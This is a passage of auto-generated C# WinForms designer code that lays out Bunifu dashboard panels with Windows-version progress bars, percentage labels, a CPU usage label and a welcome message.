        this.bunifuPanel4.Controls.Add(this.bunifuLabel_0);
        this.bunifuPanel4.Controls.Add(this.bunifuLabel125);
        this.bunifuPanel4.Controls.Add(this.bunifuLabel126);
        this.bunifuPanel4.Controls.Add(this.ProgressBarWin11);
        this.bunifuPanel4.Location = new System.Drawing.Point(383, 131);
        this.bunifuPanel4.Name = "bunifuPanel4";
        this.bunifuPanel4.ShowBorders = true;
        this.bunifuPanel4.Size = new System.Drawing.Size(116, 128);
        this.bunifuPanel4.TabIndex = 591;
        // 
        // bunifuLabel_0
        // 
        this.bunifuLabel_0.AllowParentOverrides = false;
        this.bunifuLabel_0.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.bunifuLabel_0.AutoEllipsis = false;
        this.bunifuLabel_0.AutoSize = false;
        this.bunifuLabel_0.CursorType = null;
        this.bunifuLabel_0.Font = new System.Drawing.Font("Segoe UI", 21.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.bunifuLabel_0.ForeColor = System.Drawing.Color.White;
        this.bunifuLabel_0.Location = new System.Drawing.Point(17, 27);
        this.bunifuLabel_0.Name = "bunifuLabel_0";
        this.bunifuLabel_0.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel_0.Size = new System.Drawing.Size(86, 47);
        this.bunifuLabel_0.TabIndex = 577;
        this.bunifuLabel_0.Text = "100%";
        this.bunifuLabel_0.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
        this.bunifuLabel_0.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // bunifuLabel125
        // 
        this.bunifuLabel125.AllowParentOverrides = false;
        this.bunifuLabel125.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.bunifuLabel125.AutoEllipsis = false;
        this.bunifuLabel125.AutoSize = false;
        this.bunifuLabel125.CursorType = null;
        this.bunifuLabel125.Font = new System.Drawing.Font("Segoe UI Semibold", 10.75F, System.Drawing.FontStyle.Bold);
        this.bunifuLabel125.ForeColor = System.Drawing.Color.White;
        this.bunifuLabel125.Location = new System.Drawing.Point(-219, 46);
        this.bunifuLabel125.Name = "bunifuLabel125";
        this.bunifuLabel125.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel125.Size = new System.Drawing.Size(55, 17);
        this.bunifuLabel125.TabIndex = 576;
        this.bunifuLabel125.Text = "97%";
        this.bunifuLabel125.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel125.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // bunifuLabel126
        // 
        this.bunifuLabel126.AllowParentOverrides = false;
        this.bunifuLabel126.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
        this.bunifuLabel126.AutoEllipsis = false;
        this.bunifuLabel126.CursorType = null;
        this.bunifuLabel126.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.bunifuLabel126.ForeColor = System.Drawing.Color.Silver;
        this.bunifuLabel126.Location = new System.Drawing.Point(24, 76);
        this.bunifuLabel126.Name = "bunifuLabel126";
        this.bunifuLabel126.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel126.Size = new System.Drawing.Size(70, 17);
        this.bunifuLabel126.TabIndex = 556;
        this.bunifuLabel126.Text = "Windows 11";
        this.bunifuLabel126.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel126.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // ProgressBarWin11
        // 
        this.ProgressBarWin11.AllowAnimations = false;
        this.ProgressBarWin11.Animation = 0;
        this.ProgressBarWin11.AnimationSpeed = 220;
        this.ProgressBarWin11.AnimationStep = 10;
        this.ProgressBarWin11.BackColor = System.Drawing.Color.White;
        this.ProgressBarWin11.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("ProgressBarWin11.BackgroundImage")));
        this.ProgressBarWin11.BorderColor = System.Drawing.Color.White;
        this.ProgressBarWin11.BorderRadius = 9;
        this.ProgressBarWin11.BorderThickness = 1;
        this.ProgressBarWin11.Location = new System.Drawing.Point(14, 105);
        this.ProgressBarWin11.Maximum = 100;
        this.ProgressBarWin11.MaximumValue = 100;
        this.ProgressBarWin11.Minimum = 0;
        this.ProgressBarWin11.MinimumValue = 0;
        this.ProgressBarWin11.Name = "ProgressBarWin11";
        this.ProgressBarWin11.Orientation = System.Windows.Forms.Orientation.Horizontal;
        this.ProgressBarWin11.ProgressBackColor = System.Drawing.Color.White;
        this.ProgressBarWin11.ProgressColorLeft = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.ProgressBarWin11.ProgressColorRight = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.ProgressBarWin11.Size = new System.Drawing.Size(86, 14);
        this.ProgressBarWin11.TabIndex = 571;
        this.ProgressBarWin11.Value = 55;
        this.ProgressBarWin11.ValueByTransition = 55;
        // 
        // bunifuPanel3
        // 
        this.bunifuPanel3.Anchor = System.Windows.Forms.AnchorStyles.None;
        this.bunifuPanel3.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.bunifuPanel3.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("bunifuPanel3.BackgroundImage")));
        this.bunifuPanel3.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.bunifuPanel3.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.bunifuPanel3.BorderRadius = 30;
        this.bunifuPanel3.BorderThickness = 1;
        this.bunifuPanel3.Controls.Add(this.bunifuLabel_1);
        this.bunifuPanel3.Controls.Add(this.bunifuLabel122);
        this.bunifuPanel3.Controls.Add(this.bunifuLabel123);
        this.bunifuPanel3.Controls.Add(this.ProgressBarWin10);
        this.bunifuPanel3.Location = new System.Drawing.Point(261, 131);
        this.bunifuPanel3.Name = "bunifuPanel3";
        this.bunifuPanel3.ShowBorders = true;
        this.bunifuPanel3.Size = new System.Drawing.Size(116, 128);
        this.bunifuPanel3.TabIndex = 590;
        // 
        // bunifuLabel_1
        // 
        this.bunifuLabel_1.AllowParentOverrides = false;
        this.bunifuLabel_1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.bunifuLabel_1.AutoEllipsis = false;
        this.bunifuLabel_1.AutoSize = false;
        this.bunifuLabel_1.CursorType = null;
        this.bunifuLabel_1.Font = new System.Drawing.Font("Segoe UI", 21.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.bunifuLabel_1.ForeColor = System.Drawing.Color.White;
        this.bunifuLabel_1.Location = new System.Drawing.Point(14, 27);
        this.bunifuLabel_1.Name = "bunifuLabel_1";
        this.bunifuLabel_1.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel_1.Size = new System.Drawing.Size(86, 47);
        this.bunifuLabel_1.TabIndex = 577;
        this.bunifuLabel_1.Text = "100%";
        this.bunifuLabel_1.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
        this.bunifuLabel_1.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // bunifuLabel122
        // 
        this.bunifuLabel122.AllowParentOverrides = false;
        this.bunifuLabel122.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.bunifuLabel122.AutoEllipsis = false;
        this.bunifuLabel122.AutoSize = false;
        this.bunifuLabel122.CursorType = null;
        this.bunifuLabel122.Font = new System.Drawing.Font("Segoe UI Semibold", 10.75F, System.Drawing.FontStyle.Bold);
        this.bunifuLabel122.ForeColor = System.Drawing.Color.White;
        this.bunifuLabel122.Location = new System.Drawing.Point(-219, 48);
        this.bunifuLabel122.Name = "bunifuLabel122";
        this.bunifuLabel122.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel122.Size = new System.Drawing.Size(55, 17);
        this.bunifuLabel122.TabIndex = 576;
        this.bunifuLabel122.Text = "97%";
        this.bunifuLabel122.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel122.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // bunifuLabel123
        // 
        this.bunifuLabel123.AllowParentOverrides = false;
        this.bunifuLabel123.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
        this.bunifuLabel123.AutoEllipsis = false;
        this.bunifuLabel123.CursorType = null;
        this.bunifuLabel123.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.bunifuLabel123.ForeColor = System.Drawing.Color.Silver;
        this.bunifuLabel123.Location = new System.Drawing.Point(21, 76);
        this.bunifuLabel123.Name = "bunifuLabel123";
        this.bunifuLabel123.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel123.Size = new System.Drawing.Size(72, 17);
        this.bunifuLabel123.TabIndex = 556;
        this.bunifuLabel123.Text = "Windows 10";
        this.bunifuLabel123.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel123.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // ProgressBarWin10
        // 
        this.ProgressBarWin10.AllowAnimations = false;
        this.ProgressBarWin10.Animation = 0;
        this.ProgressBarWin10.AnimationSpeed = 220;
        this.ProgressBarWin10.AnimationStep = 10;
        this.ProgressBarWin10.BackColor = System.Drawing.Color.White;
        this.ProgressBarWin10.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("ProgressBarWin10.BackgroundImage")));
        this.ProgressBarWin10.BorderColor = System.Drawing.Color.White;
        this.ProgressBarWin10.BorderRadius = 9;
        this.ProgressBarWin10.BorderThickness = 1;
        this.ProgressBarWin10.Location = new System.Drawing.Point(14, 105);
        this.ProgressBarWin10.Maximum = 100;
        this.ProgressBarWin10.MaximumValue = 100;
        this.ProgressBarWin10.Minimum = 0;
        this.ProgressBarWin10.MinimumValue = 0;
        this.ProgressBarWin10.Name = "ProgressBarWin10";
        this.ProgressBarWin10.Orientation = System.Windows.Forms.Orientation.Horizontal;
        this.ProgressBarWin10.ProgressBackColor = System.Drawing.Color.White;
        this.ProgressBarWin10.ProgressColorLeft = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.ProgressBarWin10.ProgressColorRight = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.ProgressBarWin10.Size = new System.Drawing.Size(86, 14);
        this.ProgressBarWin10.TabIndex = 571;
        this.ProgressBarWin10.Value = 50;
        this.ProgressBarWin10.ValueByTransition = 50;
        // 
        // bunifuPanel2
        // 
        this.bunifuPanel2.Anchor = System.Windows.Forms.AnchorStyles.None;
        this.bunifuPanel2.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.bunifuPanel2.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("bunifuPanel2.BackgroundImage")));
        this.bunifuPanel2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.bunifuPanel2.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.bunifuPanel2.BorderRadius = 30;
        this.bunifuPanel2.BorderThickness = 1;
        this.bunifuPanel2.Controls.Add(this.CountWin7);
        this.bunifuPanel2.Controls.Add(this.bunifuLabel33);
        this.bunifuPanel2.Controls.Add(this.bunifuLabel120);
        this.bunifuPanel2.Controls.Add(this.ProgressBarWin7);
        this.bunifuPanel2.Location = new System.Drawing.Point(139, 131);
        this.bunifuPanel2.Name = "bunifuPanel2";
        this.bunifuPanel2.ShowBorders = true;
        this.bunifuPanel2.Size = new System.Drawing.Size(116, 128);
        this.bunifuPanel2.TabIndex = 589;
        // 
        // CountWin7
        // 
        this.CountWin7.AllowParentOverrides = false;
        this.CountWin7.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.CountWin7.AutoEllipsis = false;
        this.CountWin7.AutoSize = false;
        this.CountWin7.CursorType = null;
        this.CountWin7.Font = new System.Drawing.Font("Segoe UI", 21.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.CountWin7.ForeColor = System.Drawing.Color.White;
        this.CountWin7.Location = new System.Drawing.Point(14, 27);
        this.CountWin7.Name = "CountWin7";
        this.CountWin7.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.CountWin7.Size = new System.Drawing.Size(86, 41);
        this.CountWin7.TabIndex = 577;
        this.CountWin7.Text = "100%";
        this.CountWin7.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
        this.CountWin7.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // bunifuLabel33
        // 
        this.bunifuLabel33.AllowParentOverrides = false;
        this.bunifuLabel33.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.bunifuLabel33.AutoEllipsis = false;
        this.bunifuLabel33.AutoSize = false;
        this.bunifuLabel33.CursorType = null;
        this.bunifuLabel33.Font = new System.Drawing.Font("Segoe UI Semibold", 10.75F, System.Drawing.FontStyle.Bold);
        this.bunifuLabel33.ForeColor = System.Drawing.Color.White;
        this.bunifuLabel33.Location = new System.Drawing.Point(-219, 48);
        this.bunifuLabel33.Name = "bunifuLabel33";
        this.bunifuLabel33.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel33.Size = new System.Drawing.Size(55, 17);
        this.bunifuLabel33.TabIndex = 576;
        this.bunifuLabel33.Text = "97%";
        this.bunifuLabel33.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel33.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // bunifuLabel120
        // 
        this.bunifuLabel120.AllowParentOverrides = false;
        this.bunifuLabel120.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
        this.bunifuLabel120.AutoEllipsis = false;
        this.bunifuLabel120.CursorType = null;
        this.bunifuLabel120.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.bunifuLabel120.ForeColor = System.Drawing.Color.Silver;
        this.bunifuLabel120.Location = new System.Drawing.Point(14, 76);
        this.bunifuLabel120.Name = "bunifuLabel120";
        this.bunifuLabel120.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel120.Size = new System.Drawing.Size(87, 17);
        this.bunifuLabel120.TabIndex = 556;
        this.bunifuLabel120.Text = "Windows 8\\8.1";
        this.bunifuLabel120.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel120.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // ProgressBarWin7
        // 
        this.ProgressBarWin7.AllowAnimations = false;
        this.ProgressBarWin7.Animation = 0;
        this.ProgressBarWin7.AnimationSpeed = 220;
        this.ProgressBarWin7.AnimationStep = 10;
        this.ProgressBarWin7.BackColor = System.Drawing.Color.White;
        this.ProgressBarWin7.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("ProgressBarWin7.BackgroundImage")));
        this.ProgressBarWin7.BorderColor = System.Drawing.Color.White;
        this.ProgressBarWin7.BorderRadius = 9;
        this.ProgressBarWin7.BorderThickness = 1;
        this.ProgressBarWin7.Location = new System.Drawing.Point(14, 105);
        this.ProgressBarWin7.Maximum = 100;
        this.ProgressBarWin7.MaximumValue = 100;
        this.ProgressBarWin7.Minimum = 0;
        this.ProgressBarWin7.MinimumValue = 0;
        this.ProgressBarWin7.Name = "ProgressBarWin7";
        this.ProgressBarWin7.Orientation = System.Windows.Forms.Orientation.Horizontal;
        this.ProgressBarWin7.ProgressBackColor = System.Drawing.Color.White;
        this.ProgressBarWin7.ProgressColorLeft = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.ProgressBarWin7.ProgressColorRight = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.ProgressBarWin7.Size = new System.Drawing.Size(86, 14);
        this.ProgressBarWin7.TabIndex = 571;
        this.ProgressBarWin7.Value = 50;
        this.ProgressBarWin7.ValueByTransition = 50;
        // 
        // bunifuPanel6
        // 
        this.bunifuPanel6.Anchor = System.Windows.Forms.AnchorStyles.None;
        this.bunifuPanel6.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.bunifuPanel6.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("bunifuPanel6.BackgroundImage")));
        this.bunifuPanel6.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.bunifuPanel6.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.bunifuPanel6.BorderRadius = 30;
        this.bunifuPanel6.BorderThickness = 1;
        this.bunifuPanel6.Controls.Add(this.CountWinXP);
        this.bunifuPanel6.Controls.Add(this.bunifuLabel128);
        this.bunifuPanel6.Controls.Add(this.bunifuLabel129);
        this.bunifuPanel6.Controls.Add(this.ProgressBarWinXP);
        this.bunifuPanel6.Location = new System.Drawing.Point(17, 131);
        this.bunifuPanel6.Name = "bunifuPanel6";
        this.bunifuPanel6.ShowBorders = true;
        this.bunifuPanel6.Size = new System.Drawing.Size(116, 128);
        this.bunifuPanel6.TabIndex = 588;
        // 
        // CountWinXP
        // 
        this.CountWinXP.AllowParentOverrides = false;
        this.CountWinXP.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.CountWinXP.AutoEllipsis = false;
        this.CountWinXP.AutoSize = false;
        this.CountWinXP.CursorType = null;
        this.CountWinXP.Font = new System.Drawing.Font("Segoe UI", 21.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.CountWinXP.ForeColor = System.Drawing.Color.White;
        this.CountWinXP.Location = new System.Drawing.Point(14, 29);
        this.CountWinXP.Name = "CountWinXP";
        this.CountWinXP.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.CountWinXP.Size = new System.Drawing.Size(86, 39);
        this.CountWinXP.TabIndex = 577;
        this.CountWinXP.Text = "100%";
        this.CountWinXP.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
        this.CountWinXP.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // bunifuLabel128
        // 
        this.bunifuLabel128.AllowParentOverrides = false;
        this.bunifuLabel128.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.bunifuLabel128.AutoEllipsis = false;
        this.bunifuLabel128.AutoSize = false;
        this.bunifuLabel128.CursorType = null;
        this.bunifuLabel128.Font = new System.Drawing.Font("Segoe UI Semibold", 10.75F, System.Drawing.FontStyle.Bold);
        this.bunifuLabel128.ForeColor = System.Drawing.Color.White;
        this.bunifuLabel128.Location = new System.Drawing.Point(-219, 48);
        this.bunifuLabel128.Name = "bunifuLabel128";
        this.bunifuLabel128.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel128.Size = new System.Drawing.Size(55, 17);
        this.bunifuLabel128.TabIndex = 576;
        this.bunifuLabel128.Text = "97%";
        this.bunifuLabel128.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel128.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // bunifuLabel129
        // 
        this.bunifuLabel129.AllowParentOverrides = false;
        this.bunifuLabel129.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
        this.bunifuLabel129.AutoEllipsis = false;
        this.bunifuLabel129.CursorType = null;
        this.bunifuLabel129.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.bunifuLabel129.ForeColor = System.Drawing.Color.Silver;
        this.bunifuLabel129.Location = new System.Drawing.Point(21, 76);
        this.bunifuLabel129.Name = "bunifuLabel129";
        this.bunifuLabel129.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel129.Size = new System.Drawing.Size(88, 17);
        this.bunifuLabel129.TabIndex = 556;
        this.bunifuLabel129.Text = "Windows XP\\7";
        this.bunifuLabel129.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel129.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // ProgressBarWinXP
        // 
        this.ProgressBarWinXP.AllowAnimations = false;
        this.ProgressBarWinXP.Animation = 0;
        this.ProgressBarWinXP.AnimationSpeed = 220;
        this.ProgressBarWinXP.AnimationStep = 10;
        this.ProgressBarWinXP.BackColor = System.Drawing.Color.White;
        this.ProgressBarWinXP.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("ProgressBarWinXP.BackgroundImage")));
        this.ProgressBarWinXP.BorderColor = System.Drawing.Color.White;
        this.ProgressBarWinXP.BorderRadius = 9;
        this.ProgressBarWinXP.BorderThickness = 1;
        this.ProgressBarWinXP.Location = new System.Drawing.Point(14, 105);
        this.ProgressBarWinXP.Maximum = 100;
        this.ProgressBarWinXP.MaximumValue = 100;
        this.ProgressBarWinXP.Minimum = 0;
        this.ProgressBarWinXP.MinimumValue = 0;
        this.ProgressBarWinXP.Name = "ProgressBarWinXP";
        this.ProgressBarWinXP.Orientation = System.Windows.Forms.Orientation.Horizontal;
        this.ProgressBarWinXP.ProgressBackColor = System.Drawing.Color.White;
        this.ProgressBarWinXP.ProgressColorLeft = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.ProgressBarWinXP.ProgressColorRight = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.ProgressBarWinXP.Size = new System.Drawing.Size(86, 14);
        this.ProgressBarWinXP.TabIndex = 571;
        this.ProgressBarWinXP.Value = 50;
        this.ProgressBarWinXP.ValueByTransition = 50;
        // 
        // bunifuPanel1
        // 
        this.bunifuPanel1.Anchor = System.Windows.Forms.AnchorStyles.None;
        this.bunifuPanel1.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.bunifuPanel1.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("bunifuPanel1.BackgroundImage")));
        this.bunifuPanel1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.bunifuPanel1.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.bunifuPanel1.BorderRadius = 30;
        this.bunifuPanel1.BorderThickness = 1;
        this.bunifuPanel1.Controls.Add(this.TimeME);
        this.bunifuPanel1.Controls.Add(this.LeavelDashboard);
        this.bunifuPanel1.Controls.Add(this.UsageCPU);
        this.bunifuPanel1.Controls.Add(this.MesgWelcome);
        this.bunifuPanel1.Controls.Add(this.bunifuLabel31);
        this.bunifuPanel1.Controls.Add(this.pictureBox8);
        this.bunifuPanel1.Location = new System.Drawing.Point(17, 18);
        this.bunifuPanel1.Name = "bunifuPanel1";
        this.bunifuPanel1.ShowBorders = true;
        this.bunifuPanel1.Size = new System.Drawing.Size(482, 107);
        this.bunifuPanel1.TabIndex = 570;
        // 
        // TimeME
        // 
        this.TimeME.AllowParentOverrides = false;
        this.TimeME.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.TimeME.AutoEllipsis = false;
        this.TimeME.AutoSize = false;
        this.TimeME.CursorType = null;
        this.TimeME.Font = new System.Drawing.Font("Segoe UI Semibold", 10.75F, System.Drawing.FontStyle.Bold);
        this.TimeME.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
        this.TimeME.Location = new System.Drawing.Point(384, 7);
        this.TimeME.Name = "TimeME";
        this.TimeME.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.TimeME.Size = new System.Drawing.Size(86, 19);
        this.TimeME.TabIndex = 578;
        this.TimeME.Text = "00 : 00 ";
        this.TimeME.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
        this.TimeME.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // LeavelDashboard
        // 
        this.LeavelDashboard.AllowDrop = true;
        this.LeavelDashboard.BackColor = System.Drawing.Color.Transparent;
        this.LeavelDashboard.CausesValidation = false;
        this.LeavelDashboard.Location = new System.Drawing.Point(21, 68);
        this.LeavelDashboard.Name = "LeavelDashboard";
        this.LeavelDashboard.RatingColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(128)))), ((int)(((byte)(0)))));
        this.LeavelDashboard.Size = new System.Drawing.Size(96, 20);
        this.LeavelDashboard.TabIndex = 577;
        this.LeavelDashboard.TabStop = false;
        this.LeavelDashboard.UseWaitCursor = true;
        // 
        // UsageCPU
        // 
        this.UsageCPU.AllowParentOverrides = false;
        this.UsageCPU.AutoEllipsis = false;
        this.UsageCPU.CursorType = null;
        this.UsageCPU.Font = new System.Drawing.Font("Segoe UI Semibold", 10.75F, System.Drawing.FontStyle.Bold);
        this.UsageCPU.ForeColor = System.Drawing.Color.White;
        this.UsageCPU.Location = new System.Drawing.Point(125, 45);
        this.UsageCPU.Name = "UsageCPU";
        this.UsageCPU.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.UsageCPU.Size = new System.Drawing.Size(20, 19);
        this.UsageCPU.TabIndex = 576;
        this.UsageCPU.Text = "0%";
        this.UsageCPU.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.UsageCPU.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // MesgWelcome
        // 
        this.MesgWelcome.AutoSize = true;
        this.MesgWelcome.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.MesgWelcome.Font = new System.Drawing.Font("Segoe UI", 14.25F, System.Drawing.FontStyle.Bold);
        this.MesgWelcome.ForeColor = System.Drawing.Color.White;
        this.MesgWelcome.Location = new System.Drawing.Point(16, 17);
        this.MesgWelcome.Name = "MesgWelcome";
        this.MesgWelcome.Size = new System.Drawing.Size(244, 25);
        this.MesgWelcome.TabIndex = 575;
        this.MesgWelcome.Text = "Welcome Back, Fransesco!";
        // 
        // bunifuLabel31
        // 
        this.bunifuLabel31.AllowParentOverrides = false;
        this.bunifuLabel31.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
        this.bunifuLabel31.AutoEllipsis = false;
        this.bunifuLabel31.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.bunifuLabel31.CursorType = null;
        this.bunifuLabel31.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.bunifuLabel31.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
        this.bunifuLabel31.Location = new System.Drawing.Point(22, 45);
        this.bunifuLabel31.Name = "bunifuLabel31";
        this.bunifuLabel31.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel31.Size = new System.Drawing.Size(96, 17);
        this.bunifuLabel31.TabIndex = 556;
        this.bunifuLabel31.Text = "Based on usage";
        this.bunifuLabel31.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel31.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // pictureBox8
        // 
